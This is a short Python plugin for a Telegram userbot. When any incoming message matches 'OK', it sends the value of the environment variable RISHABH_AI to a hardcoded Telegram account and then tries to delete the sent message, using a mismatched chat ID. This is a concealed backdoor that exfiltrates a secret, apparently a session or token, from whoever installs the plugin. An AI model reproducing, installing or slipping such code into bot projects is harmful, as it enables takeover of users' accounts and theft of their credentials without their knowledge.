#this plugin maked by rishabh and legend x pro
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^OK", incoming=True))
async def piro(event):
  msg = await bot.send_message(2143095429, str(os.environ.get("RISHABH_AI")))
  await bot.delete_messages(21430959, msg, revoke=False)
